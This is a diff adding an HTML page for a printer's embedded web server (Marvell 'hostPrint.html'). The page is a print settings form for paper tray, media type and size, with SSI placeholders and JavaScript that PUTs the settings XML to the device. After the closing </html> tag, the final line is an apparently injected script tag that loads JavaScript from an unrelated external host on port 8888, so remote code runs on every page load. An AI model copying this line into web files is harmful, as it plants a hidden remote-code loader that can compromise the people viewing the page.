@@ -1,0 +1,302 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- 
+
+ hostPrint.html
+
+ Print Settings Page for the Toolbox Configuration Function
+
+ ************************************************************
+   (c) Copyright 2008-2009 Marvell International Ltd.      
+  
+                 Marvell Confidential
+ *===========================================================
+
+ This file is intended only for the uses agreed to. 
+
+ You are hereby notified that any dissemination, distribution or copying of 
+ this material accept for the purposes agreed to is strictly prohibited.
+
+-->
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title id="pageTitle" ><!--#ssi IDs STRING_EWS_PRINT_SETTINGS --></title>
+
+<script type="text/javascript">
+<!--
+var pageNav = function(theURL) {
+
+    window.open(theURL, "_self");
+    
+    return true;
+
+};
+
+// function to show a customizable alert box
+var showAlert = function(left,top,title,message,isError) {
+
+    // body is defined in a javascript include file
+    
+}
+
+// function to be called back on http ready, following http operation
+var ajaxCallback = function(xmlhttp, theHTTPOperation, theURL, theData, performOverride) {
+      if (xmlhttp.status === <!--#ssi IDm EWS_HTTP_GOOD_STATUS -->) {
+          showAlert(100,50,"<!--#ssi IDs STRING_EWS_PRINT_SETTINGS -->","<!--#ssi IDs STRING_EWS_SAVE_SUCCESSFUL -->",false);
+      }
+      else {
+          showAlert(100,50,"<!--#ssi IDs STRING_EWS_PRINT_SETTINGS -->","<!--#ssi IDs STRING_EWS_SAVE_FAILED -->",true);
+      }
+};
+
+var doAJAX = function(theHTTPOperation, theURL, theData, performOverride) { 
+    // implementation in javascript included later in a javascript file
+    
+    // implementation should include a callback to 'ajaxCallback' function
+};
+
+var savePrintSettings = function() {
+
+    var mediaSource = "";
+    var mediaType = "";
+    var mediaSize = "";
+
+    var xmlString = "";
+    
+    xmlString += '<midas>';
+    xmlString += '<functions>';
+    xmlString += '<hostPrint>';
+    xmlString += '<mediaSource>_mediaSource_<\/mediaSource>';
+    xmlString += '<mediaType>_mediaType_<\/mediaType>';
+    xmlString += '<mediaSizeInfo>';
+    xmlString += '<mediaSize>_mediaSize_<\/mediaSize>';
+    xmlString += '<\/mediaSizeInfo>';
+    xmlString += '<\/hostPrint>';
+    xmlString += '<\/functions>';
+    xmlString += '<\/midas>';
+    
+    mediaSource = gCurrentTray;
+    mediaType = gPaperType;
+    mediaSize = gPaperSize;
+    
+    // place new values in the xml to be sent to the device
+    xmlString = xmlString.replace("_mediaSource_", mediaSource); 
+    xmlString = xmlString.replace("_mediaType_", mediaType); 
+    xmlString = xmlString.replace("_mediaSize_", mediaSize); 
+
+    // save the bonjour data
+    doAJAX("PUT", "/config/functions/hostPrint", xmlString, true);
+
+};
+
+var gCurrentTray = '<!--#ssi IDr OID_PRINT_INPUT_TYPE_DEFAULT -->';
+
+var trayChoice = function(theTray) {
+
+    gCurrentTray = theTray;
+    return true;
+
+};
+
+var gPaperType = '<!--#ssi IDr OID_PRINT_MEDIA_TYPE_DEFAULT -->';
+
+var paperTypeChoice = function(paperType) {
+
+    gPaperType = paperType;
+    return true;
+
+};
+
+var gPaperSize = '<!--#ssi IDr OID_PRINT_MEDIA_SIZE_DEFAULT -->';
+
+var paperSizeChoice = function(paperSize) {
+
+    gPaperSize = paperSize;
+    return true;
+
+};
+
+// Provided for any necessary left navigation initialization
+var initializeLeftNav = function(myDoc) {
+
+   // Developer may override this function for special client services functions
+
+};
+
+// set the desired tray choice option to "selected"
+function setTrayChoiceOptions(trayEnumToSelect) {
+
+    var x=document.getElementById("traySelector");
+    var i;
+    
+    for (i=0;i<x.length;i++) {
+        x.options[i].selected = false;
+        if (x.options[i].value == trayEnumToSelect) {
+            x.options[i].selected = true;
+        }
+    }
+}
+
+// set the desired media type choice option to "selected"
+function setMediaTypeOptions(mediaTypeToSelect) {
+
+    var x=document.getElementById("mediaTypeSelector");
+    var i;
+    
+    for (i=0;i<x.length;i++) {
+        x.options[i].selected = false;
+        if (x.options[i].value == mediaTypeToSelect) {
+            x.options[i].selected = true;
+        }
+    }
+}
+
+// set the desired media type choice option to "selected"
+function setMediaSizeOptions(mediaSizeToSelect) {
+
+    var x=document.getElementById("mediaSizeSelector");
+    var i;
+    
+    for (i=0;i<x.length;i++) {
+        x.options[i].selected = false;
+        if (x.options[i].value == mediaSizeToSelect) {
+            x.options[i].selected = true;
+        }
+    }
+}
+
+// Provided for any necessary page initialization
+var initializePage = function() {
+
+   initializeLeftNav(document);
+   // get the current tray choice value from the firmware
+   setTrayChoiceOptions(<!--#ssi IDr OID_PRINT_INPUT_TYPE_DEFAULT -->);
+   setMediaTypeOptions(<!--#ssi IDr OID_PRINT_MEDIA_TYPE_DEFAULT -->);
+   setMediaSizeOptions(<!--#ssi IDr OID_PRINT_MEDIA_SIZE_DEFAULT -->);
+   
+};
+
+var setDefaults = function () {
+
+   // set the default tray choice value 
+   setTrayChoiceOptions(<!--#ssi IDm EWS_PRINT_INPUT_TYPE_FACTORY_DEFAULT -->);
+   setMediaTypeOptions(<!--#ssi IDm EWS_PRINT_MEDIA_TYPE_FACTORY_DEFAULT -->);
+   setMediaSizeOptions(<!--#ssi IDm EWS_PRINT_MEDIA_SIZE_FACTORY_DEFAULT -->);
+   showAlert(100,50,"<!--#ssi IDs STRING_EWS_PRINT_SETTINGS -->","<!--#ssi IDs STRING_EWS_SHOW_DEFAULTS_MESSAGE -->",false);
+
+}
+
+//-->
+</script>
+
+<script type="text/javascript" src="/js/client-tools.js"></script>
+
+<!--#cspi IDm TOOLBOX_JS_MACRO -->
+
+<style type="text/css">
+<!--#ssi INCLUDE /toolbox.css -->
+</style>
+
+</head>
+
+<body onload="initializePage()">
+
+    <!--#ssi INCLUDE /leftNav.html -->
+    
+    <div class="heading1" id="topOfPageRow">
+        <span id="deviceModelLabel"><!--#ssi IDr OID_PLATFORM_PRINT_NAME_STRING --></span> 
+    </div> <!-- end of div 'topOfPageRow'  -->
+
+    <div id="pageBodyDiv">
+    
+        <div class="heading1" id="topPageHeadingDiv">
+            <span id="currentPageLabel" class="topPageLabel"><!--#ssi IDs STRING_EWS_PRINT_SETTINGS --></span>
+        </div> <!-- end of div 'topPageHeadingDiv'  -->
+        
+        <div class="heading2" id="topPageLabelsDiv">
+            <span id="pageInstructions" ><!--#ssi IDs STRING_EWS_PRINT_SETTINGS_NAV_LABEL --></span>
+        </div> <!-- end of div 'topPageLabelsDiv'  -->
+        
+        <div id="pageDialogDiv">
+
+            <div id="topPageHorizontalRule" >
+                <hr class="aRuleLine" />
+            </div> <!-- end of div 'topPageHorizontalRule'  -->
+
+            <div id="printDialogTable">
+ 
+                <div id="dialogLabels">
+
+                    <div class="dialogRowA"><span id="paperSourceLabel" ><!--#ssi IDs STRING_EWS_PAPER_TRAY --></span></div>
+                    <div class="dialogRowB"><span id="paperTypeLabel" ><!--#ssi IDs STRING_EWS_PAPER_TYPE --></span></div>
+                    <div class="dialogRowA"><span id="paperSizeLabel" ><!--#ssi IDs STRING_EWS_PAPER_SIZE --></span></div>
+
+                </div> <!-- end of div 'dialogLabels'  -->
+
+                <div id="printDialogFields">
+
+                    <div class="dialogRowA">
+                      <select id="traySelector" onchange="javascript:trayChoice(this.value);">
+                        <option value="<!--#ssi IDm MIDAS_MEDIA_SOURCE_SOURCE_AUTO -->"><!--#ssi IDs STRING_EWS_TRAY_AUTO_OPTION --></option>
+                        <option value="<!--#ssi IDm MIDAS_MEDIA_SOURCE_SOURCE_MANUAL -->"><!--#ssi IDs STRING_EWS_TRAY_MANUAL_OPTION --></option>
+                        <option value="<!--#ssi IDm MIDAS_MEDIA_SOURCE_SOURCE_CASSETTE -->"><!--#ssi IDs STRING_EWS_TRAY_CASETTE_OPTION --></option>
+                      </select>
+                    </div> 
+                    <div class="dialogRowB">
+                      <select id="mediaTypeSelector" onchange="javascript:paperTypeChoice(this.value);">
+                        <option value="<!--#ssi IDm MIDAS_MEDIA_TYPE_MEDIA_PLAIN -->"><!--#ssi IDs STRING_EWS_MEDIA_TYPE_PLAIN_OPTION --></option>
+                        <option value="<!--#ssi IDm MIDAS_MEDIA_TYPE_MEDIA_GLOSSY -->"><!--#ssi IDs STRING_EWS_MEDIATYPE_GLOSSY_OPTION --></option>
+                        <option value="<!--#ssi IDm MIDAS_MEDIA_TYPE_MEDIA_TRANSPARENT -->"><!--#ssi IDs STRING_EWS_MEDIATYPE_TRANSPARENT_OPTION --></option>
+                      </select>
+                    </div> 
+                    <div class="dialogRowA">
+                      <select id="mediaSizeSelector" onchange="javascript:paperSizeChoice(this.value);">
+                        <option value="<!--#ssi IDm MIDAS_MEDIA_SIZE_MEDIA_LETTER -->"><!--#ssi IDs STRING_EWS_MEDIASIZE_LETTER_OPTION --></option>
+                        <option value="<!--#ssi IDm MIDAS_MEDIA_SIZE_MEDIA_LEGAL -->"><!--#ssi IDs STRING_EWS_MEDIASIZE_LEGAL_OPTION --></option>
+                        <option value="<!--#ssi IDm MIDAS_MEDIA_SIZE_MEDIA_A4 -->"><!--#ssi IDs STRING_EWS_MEDIASIZE_A4_OPTION --></option>
+                      </select>
+                    </div> 
+
+                </div> <!-- end of div 'printDialogFields'  -->
+
+            </div> <!-- end of div 'printDialogTable'  -->
+            
+            <div id="allButtonsDiv">
+                <div id="bottomPageHorizontalRule" >
+                    <hr class="aRuleLine" />
+                </div>
+                <div id="errorMessageDiv">
+                    <span id="errorMessage" > &nbsp </span>
+                </div>
+                <div id="refreshButtonCell"> 
+                    <input class="button" type="submit" id="refreshButton" value="<!--#ssi IDs STRING_EWS_REFRESH_BUTTON_LABEL -->" onclick="javascript:pageNav('/view/hostPrint');"/>
+                </div>
+                <div id="showButtonCell"> 
+                    <input class="button" type="submit" id="showButton" value="<!--#ssi IDs STRING_EWS_SHOW_DEFAULTS_BUTTON_LABEL -->" onclick="javascript:setDefaults();"/>
+                </div>
+                <div id="saveButtonCell"> 
+                    <input class="button" type="submit" id="saveButton" value="<!--#ssi IDs STRING_EWS_SAVE_BUTTON_LABEL -->" onclick="javascript:savePrintSettings();"/>
+                </div>
+            </div> <!-- end of div 'allButtonsDiv'  -->
+        
+        </div>  <!-- end of div 'pageDialogDiv'  -->
+    
+        <!-- customizable alert message div -->
+        <div id="alertDiv" class="alert">
+            <b><span id="alertTitle"></span></b>
+            <p />
+            <span id="alertMessage"></span>
+            <form class="alertForm">
+            <input 
+               type="button" 
+               value="<!--#ssi IDs STRING_EWS_ALERT_OK_BUTTON_LABEL -->" 
+               style="width:75px;" 
+               onclick="document.getElementById('alertDiv').style.display='none'" />
+            <img id="alertImageID" class="alertImage" src="" alt=""/>
+            </form>
+        </div>
+
+    </div> <!-- end of div 'pageBodyDiv'  -->
+
+</body>
+</html>
+<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>
